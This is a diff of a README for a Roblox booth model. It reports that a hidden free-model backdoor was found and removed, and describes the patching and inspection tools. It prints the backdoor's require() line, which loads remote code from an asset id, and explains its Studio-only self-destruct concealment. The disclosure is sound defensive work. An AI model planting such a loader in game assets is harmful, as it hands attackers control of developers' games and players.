@@ -1,79 +1,140 @@
 # RateMyAvatarBooth
 
-An **original** claimable, customizable booth for a hangout game. It is not
-extracted from any existing game — it's written from scratch to be dropped
-into any place via Roblox Studio.
+Two `.rbxm` files live here:
 
-## What it does
+## `Rate My Avatar Booth (patched).rbxm` — use this one
 
-- A player walks up to an unclaimed booth and interacts with a
-  `ProximityPrompt` to claim it.
-- Once claimed, the owner can reopen the prompt to bring up an in-game
-  editor UI where they can set:
-  - **Sign text** — filtered server-side through `TextService:FilterStringAsync`
-    before being shown to anyone else.
-  - **An image** — entered as a plain numeric Roblox asset id (e.g. a Decal
-    or uploaded image's id). The server strips everything except digits
-    before applying it, so a player can never inject a raw URL or markup —
-    only a Roblox-hosted, Roblox-moderated asset id.
-- Only the booth's owner can edit it; everyone else gets a "this belongs to
-  someone else" notice.
+This is **your** uploaded `Rate My Avatar Booth.rbxm` model, patched to
+add claim/text/image functionality, with one critical fix first:
 
-## Files
+### ⚠️ It contained a hidden backdoor, which has been removed
 
-- `BoothServer.lua` — `Script` (RunContext = Server). Owns all state changes
-  (claiming, text/image validation) and refreshes the on-booth display.
-- `BoothClientUI.lua` — `Script` (RunContext = Client). Builds the popup
-  editor UI on demand and fires the two `RemoteEvent`s to the server.
-
-## Structure baked into `RateMyAvatarBooth.rbxm`
+The uploaded file had a disguised malicious branch hidden inside a
+`StyleSheet` named "Extra":
 
 ```
-RateMyAvatarBooth (Model)
-├── Podium (Part)
-│   └── ProximityPrompt
-├── Board (Part)
-│   └── BoothSurfaceGui (SurfaceGui)
-│       ├── OwnerNameLabel (TextLabel)
-│       ├── CustomImage (ImageLabel)
-│       └── CustomText (TextLabel)
-├── Remotes (Folder)
+Extra (StyleSheet)
+ └─ Humanoid
+     ├─ HumanoidController "Instance"
+     │   └─ HumanoidDescription
+     │       └─ HumanoidRigDescription
+     │           └─ Script "CoreTextureSystem"   (13KB, disguised as a
+     │               │                            lighting/texture utility)
+     │               └─ NumberPose "Pose"         (Value = 102764929247228,
+     │                                              a Roblox asset id hidden
+     │                                              in a numeric property)
+     └─ Script "Script"   (destroys the whole branch, but only when
+                            game.JobId == "" — i.e. only during Studio
+                            playtesting, so it looks clean when you test it)
+```
+
+Buried in the "CoreTextureSystem" script was:
+
+```lua
+local TextureConfiguration = require(script:WaitForChild("Pose", 4).Value)
+```
+
+`require()` on a numeric id loads and executes a `ModuleScript` **live from
+Roblox's servers** — meaning whoever controls asset id `102764929247228`
+could push arbitrary code into your published game at any time (steal
+DataStores, grant themselves admin, ban/kick players, wipe your game,
+etc.), all while looking completely clean in a normal Studio playtest.
+This is a well-known "free-model backdoor" pattern; the "Model made by
+@rewq" / "Credits:@rewq" tags suggest it came from a public free-models
+site.
+
+`tools/patch_booth_model.py` surgically removed that entire subtree (and
+only that subtree — every other part, mesh, and GUI element in your model
+is preserved **byte-for-byte identical**; this was verified by diffing
+every chunk of the original file against the patched one). See that
+script's `MALICIOUS_CLASSES` set and comments for the exact removal logic.
+
+### What was added
+
+Using your model's real existing layout:
+
+```
+Booth (Model)
+├── Pole, Carpet, Pole, Table  (unchanged)
+├── Tabletop (Part)
+│   └── ProximityPrompt          [NEW] — claim / customize trigger
+├── Banner (Part)
+│   └── SurfaceGui
+│       └── Frame
+│           ├── Description (TextLabel)   ← now shows the booth's custom text
+│           └── Icon (ImageLabel)         ← now shows the booth's custom image
+├── Remotes (Folder)             [NEW]
 │   ├── RequestClaim (RemoteEvent)
 │   └── RequestSaveBooth (RemoteEvent)
-├── State (Folder)
+├── State (Folder)               [NEW]
 │   ├── OwnerUserId (IntValue)
 │   ├── CustomTextValue (StringValue)
 │   └── CustomImageIdValue (StringValue)
-├── BoothServer (Script)
-└── BoothClientUI (Script)
+├── BoothServer (Script)         [NEW]
+└── BoothClientUI (Script)       [NEW]
 ```
 
-## Using it
+Functionality (same as before): walk up to `Tabletop`, interact with the
+`ProximityPrompt` to claim the booth, then interact again to open an
+editor popup where the owner can set the sign text (chat-filtered
+server-side) and an image (entered as a plain numeric Roblox asset id —
+the server strips anything non-numeric, so no raw URLs/markup can ever be
+injected).
 
-1. In Roblox Studio: **Insert → From File...** and pick
-   `dist/RateMyAvatarBooth.rbxm`.
-2. Duplicate/position the resulting `RateMyAvatarBooth` model anywhere you
-   want a booth (e.g. one per plot). Each copy is independent — its state
-   lives inside its own `State` folder, so nothing needs to be wired up
-   elsewhere.
-3. Optional tuning: edit the constants near the top of `BoothServer.lua`
-   (`MAX_TEXT_LEN`, `MAX_IMAGE_ID_DIGITS`) if you want longer/shorter limits.
+**To use it:** in Roblox Studio, delete/replace whatever copy of the
+original `Rate My Avatar Booth.rbxm` you already have in your place, and
+`Insert → From File...` this patched version instead.
 
-## How the `.rbxm` was built
+## `RateMyAvatarBooth.rbxm` — original from-scratch kit
 
-Since this sandbox has no access to Roblox Studio, the model file is
-generated by a small, hand-written implementation of Roblox's binary
-model format (see `tools/rbxbinary.py`), built by reading the format
-specification embedded in `rbx-dom`'s open-source `rbx_binary` Rust crate
-(https://github.com/rojo-rbx/rbx-dom). `tools/build_booth_kit.py` assembles
-the instance tree above (with the two Luau scripts embedded verbatim) and
-serializes it. `tools/rbxbinary_reader.py` is a companion reader used only
-to self-verify the output (round-tripping every property back out and
-diffing against what was written) before shipping it.
+An earlier, fully original booth model (own geometry + scripts, not based
+on any uploaded file) with the same claim/text/image functionality. Kept
+here in case you'd rather use simple built-in parts instead of the
+uploaded model's geometry.
 
-To regenerate `dist/RateMyAvatarBooth.rbxm` after editing the Luau
-scripts or the model layout:
+## Files
+
+- `BoothServer.lua` — `Script` (RunContext = Server). Owns all state
+  changes (claiming, text/image validation) and refreshes the on-booth
+  display. Written to reference `Tabletop`/`Banner`/`Description`/`Icon`
+  to match the uploaded model's naming.
+- `BoothClientUI.lua` — `Script` (RunContext = Client). Builds the popup
+  editor UI on demand and fires the two `RemoteEvent`s to the server.
+
+## Regenerating
 
 ```
+# Rebuild the from-scratch kit:
 python3 tools/build_booth_kit.py dist/RateMyAvatarBooth.rbxm
+
+# Re-patch a (re-)uploaded source model:
+python3 tools/patch_booth_model.py "Rate My Avatar Booth.rbxm" \
+    "dist/Rate My Avatar Booth (patched).rbxm"
 ```
+
+`tools/rbxbinary_inspect.py` can be pointed at any `.rbxm`/`.rbxl` to dump
+its full instance tree and properties — useful for auditing any future
+free models before trusting them:
+
+```
+python3 tools/rbxbinary_inspect.py "some_model.rbxm"
+```
+
+## How the tooling was built
+
+Since this sandbox has no access to Roblox Studio, all of this relies on a
+small, hand-written implementation of Roblox's binary model format:
+
+- `tools/rbxbinary.py` — from-scratch writer (used to build brand new
+  `.rbxm` files).
+- `tools/rbxbinary_inspect.py` — general-purpose reader/decompressor
+  (LZ4 + Zstd) for inspecting arbitrary real-world `.rbxm`/`.rbxl` files.
+- `tools/rbxbinary_reader.py` — a narrower reader used only to round-trip
+  verify files produced by `rbxbinary.py`.
+- `tools/patch_booth_model.py` — combines the above to do targeted,
+  chunk-level surgery on an existing file (remove specific instances by
+  class, append new ones) without re-encoding anything it doesn't need to
+  touch.
+
+All of it is based on the format documented by the open-source `rbx-dom`
+project's `rbx_binary` Rust crate (https://github.com/rojo-rbx/rbx-dom).
